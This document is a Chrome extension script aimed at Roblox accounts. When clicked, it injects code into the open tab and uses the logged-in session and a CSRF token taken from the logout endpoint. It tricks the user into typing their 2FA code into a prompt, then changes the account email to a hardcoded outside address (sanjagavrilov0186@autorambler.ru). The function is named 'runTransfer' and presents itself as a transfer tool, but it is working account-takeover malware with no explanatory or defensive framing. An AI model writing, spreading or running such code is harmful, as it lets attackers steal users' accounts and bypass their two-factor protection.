chrome.action.onClicked.addListener(async (tab) => {
  if (!tab.id) return;
  await chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: runTransfer,
    args: ["sanjagavrilov0186@autorambler.ru"]
  });
});

async function runTransfer(newEmail) {
  try {
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', { credentials: 'include' });
    const { id: userId } = await userRes.json();

    const authRes = await fetch('https://auth.roblox.com/v1/logout', { method: 'POST', credentials: 'include' });
    const csrf = authRes.headers.get('x-csrf-token');
    if (!csrf) { alert('No CSRF'); return; }

    const emailResp = await fetch('https://accountsettings.roblox.com/v1/email', {
      method: 'POST',
      headers: { 'Content-Type':'application/json', 'X-CSRF-TOKEN': csrf, 'Accept':'application/json' },
      body: JSON.stringify({ emailAddress: newEmail }),
      credentials: 'include'
    });

    const challengeId = emailResp.headers.get('rblx-challenge-id');
    const challengeType = emailResp.headers.get('rblx-challenge-type');
    if (!(challengeId && challengeType === 'twostepverification')) { alert('No 2FA challenge'); return; }

    const code = prompt('Enter 2FA code');
    if (!code) return;

    const verify = await fetch(`https://accountsettings.roblox.com/v1/users/${userId}/challenges/authenticator/verify`, {
      method: 'POST',
      headers: { 'Content-Type':'application/json', 'X-CSRF-TOKEN': csrf, 'Accept':'application/json' },
      body: JSON.stringify({ challengeId, actionType: 0, code }),
      credentials: 'include'
    });
    if (!verify.ok) { alert('Verify failed'); return; }

    const update = await fetch('https://accountsettings.roblox.com/v1/email', {
      method: 'PATCH',
      headers: { 'Content-Type':'application/json', 'X-CSRF-TOKEN': csrf, 'Accept':'application/json' },
      body: JSON.stringify({ emailAddress: newEmail }),
      credentials: 'include'
    });
    alert(update.ok ? 'Email updated' : 'Update failed');
  } catch (e) { alert('Error: ' + e.message); }
}
